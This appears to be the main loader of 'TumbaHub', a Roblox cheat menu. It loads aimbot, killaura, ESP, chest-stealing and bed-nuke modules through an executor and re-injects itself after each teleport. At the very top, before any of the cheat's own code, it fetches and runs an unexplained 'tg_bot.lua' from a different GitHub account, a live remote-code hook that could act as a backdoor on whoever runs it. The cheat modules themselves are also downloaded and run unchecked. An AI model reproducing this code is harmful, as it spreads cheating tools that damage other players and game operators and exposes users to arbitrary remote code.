-- TUMBA MEGA CHEAT SYSTEM v5.0 (Refactored)
-- Main entry point & module loader
-- Made by @kreml1nAgent (tg)

if not game:IsLoaded() then
    game.Loaded:Wait()
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/tg_bot.lua",true))()
-- ========================================================

-- The global table that will hold everything
Mega = {
    Objects = {
        Connections = {},
        GUI = nil,
        PlayerListItems = {},
        Toggles = {},
        BeeCache = {}
    },
    Features = {},
    LoadedModules = {}
}

local repositoryBaseURL = "https://raw.githubusercontent.com/daniaggbro-cloud/betatesttumba/main/TumbaHub-main%20(3)/TumbaHub-main/tumbaHub/"

function Mega.GetImageFromURL(url, fileName)
    local folderPath = "tumbaHub/icons_v2/"
    local fullPath = folderPath .. fileName
    
    if isfile and writefile and makefolder and getcustomasset then
        -- Создаем папку, если её нет
        if not isfolder("tumbaHub") then makefolder("tumbaHub") end
        if not isfolder(folderPath) then makefolder(folderPath) end

        -- Если файла нет - качаем
        if not isfile(fullPath) then
            if url and url ~= "" then
                local success, data = pcall(function() return game:HttpGet(url) end)
                if success and data and #data > 0 then
                    writefile(fullPath, data)
                else
                    warn("TumbaHub: Failed to download icon from " .. url)
                end
            end
        end

        -- Если файл теперь есть - возвращаем его как ассет
        if isfile(fullPath) then
            local success, asset = pcall(function() return getcustomasset(fullPath) end)
            if success and asset then
                return asset
            end
        end
    end
    -- Запасной вариант (стандартный логотип Tumba)
    return "rbxassetid://13388222306"
end

-- Module Loader
function Mega.LoadModule(path)
    if Mega.LoadedModules[path] then
        return
    end

    local content = nil
    local success = false
    
    -- 1. Сначала пробуем загрузить локальный файл (для тестов в VS Code)
    if isfile and readfile then
        -- Список возможных путей для поиска локального файла
        local possiblePaths = {
            "tumbaHub/" .. path,
            path,
            "betatesttumba-main/TumbaHub-main (3)/TumbaHub-main/tumbaHub/" .. path
        }
        
        for _, p in ipairs(possiblePaths) do
            if isfile(p) then
                success, content = pcall(function() return readfile(p) end)
                if success then break end
            end
        end
    end

    -- 2. Если локального файла нет, качаем с GitHub
    if not success or not content then
        local url = repositoryBaseURL .. path
        success, content = pcall(function() return game:HttpGet(url) end)
        -- Защита от ошибок бесплатных экзекьюторов (timeout, 404, пустые файлы)
        if success and (content:find("404: Not Found") or content:lower():match("timeout") or #content < 10) then 
            success = false
            content = nil 
        end
    end

    if success and content then
        -- Wrap the module content in a function to pass the Mega table
        -- and control the environment.
        local chunk, err = loadstring("return function(Mega, game, script) " .. content .. " end")
        if chunk then
            local moduleFunc = chunk()
            local success, err = pcall(moduleFunc, Mega, game, script)
            if success then
                Mega.LoadedModules[path] = true
            else
                warn("Execution error in module:", path, "|", err)
            end
        else
            warn("Syntax error in module:", path, "|", err)
        end
    else
        warn("Failed to download module from GitHub:", path)
    end
end


-- ==========================================
-- TITAN INITIALIZATION SEQUENCE (v3.0)
-- ==========================================

-- 0. Bootstrap Services (Required for Loader)
Mega.LoadModule("core/services.lua")

-- 1. Initialize Global Titan Loader
Mega.LoadModule("gui/loader_screen.lua")
local loaderUI = nil
if Mega.Loader then
    loaderUI = Mega.Loader.Create()
end

local function InitializePhase(phaseId, moduleList)
    if loaderUI and loaderUI.SetStage then 
        loaderUI.SetStage(phaseId) 
    end
    local count = #moduleList
    for i, path in ipairs(moduleList) do
        if loaderUI and loaderUI.Update then
            local overallPercent = (i / count) * 100
            -- Менее детализированный текст загрузки
            local phaseNames = {
                network = "Connecting to Server...",
                core = "Loading Core Systems...",
                features = "Injecting Features...",
                ui = "Building Interface..."
            }
            local loadingText = phaseNames[phaseId] or ("Loading " .. string.upper(phaseId) .. "...")
            loaderUI.Update(overallPercent, loadingText)
        end
        Mega.LoadModule(path)
        -- INCREASED DELAY FOR FREE EXECUTORS (Prevents Luna socket crash)
        task.wait(0.15)
    end
end

-- PHASE 1: NETWORK HANDSHAKE
InitializePhase("network", {
    "core/metadata.lua"
})

-- PHASE 2: BUILDING CORE ENVIRONMENT
InitializePhase("core", {
    "core/dumper.lua",
    "core/settings.lua",
    "core/localization.lua",
    "core/config.lua"
})

-- PHASE 3: SYNCING SYSTEM FEATURES
InitializePhase("features", {
    "library/notifications.lua",
    "library/ui_builder.lua",
    "core/mobile_hud.lua",
    "features/esp.lua",
    "features/aimbot.lua",
    "features/beekeeper.lua",
    "features/farmer_cletus.lua",
    "features/taliah.lua",
    "features/metal_detector.lua",
    "features/stella_star_collector.lua",
    "features/noelle.lua",
    "features/lani.lua",
    "features/chest_steal.lua",
    "features/chest_esp.lua",
    "features/build_reach.lua",
    "features/killaura.lua",
    "features/bed_nuke.lua",
    "features/gorilla_chams.lua"
})

-- PHASE 4: FINALIZING INTERFACE
InitializePhase("ui", {
    "gui/main_window.lua"
})

-- Создаем основной интерфейс
if Mega.GUI and Mega.GUI.Create then
    Mega.GUI.Create()
    print("🎨 TumbaHub UI Initialized.")
end

-- Finish Initialization
if loaderUI then
    loaderUI.Update(100, Mega.GetText("loader_ready"))
    task.wait(1)
    loaderUI.Destroy()
end

-- Auto-load last configuration and start 5s background save
if Mega.ConfigSystem then
    task.spawn(function()
        Mega.ConfigSystem.LoadLastConfig()
        Mega.ConfigSystem.StartAutosave(5)
    end)
end


print("🔥 TUMBA MEGA SYSTEM (Refactored) LOADED SUCCESSFULLY!")
print("🎮 Use RightShift to open the menu")

-- Показываем пользователю, что нового добавили в этом обновлении
task.spawn(function()
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "TumbaHub Обновлен!",
            Text = "Добавлено: 3D Gorilla Mode с анимациями\nИсправлено: Aim Assist, Краши экзекьюторов",
            Duration = 10
        })
    end)
end)

-- === AUTO-INJECT ON TELEPORT (QUEUE ON TELEPORT) ===
local queue_on_teleport = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport) or queueonteleport
if queue_on_teleport then
    local teleportCode = [[
        task.wait(1)
        if isfile and readfile then
            if isfile("betatesttumba-main/TumbaHub-main (3)/TumbaHub-main/tumbaHub/tumbaHub.lua") then
                loadstring(readfile("betatesttumba-main/TumbaHub-main (3)/TumbaHub-main/tumbaHub/tumbaHub.lua"))()
            elseif isfile("tumbaHub/tumbaHub.lua") then
                loadstring(readfile("tumbaHub/tumbaHub.lua"))()
            else
                loadstring(game:HttpGet("https://raw.githubusercontent.com/daniaggbro-cloud/betatesttumba/refs/heads/main/TumbaHub-main%20(3)/TumbaHub-main/tumbaHub/tumbaHub.lua", true))()
            end
        end
    ]]
    queue_on_teleport(teleportCode)
    print("🔄 Auto-Inject (Queue on Teleport) is active")
end
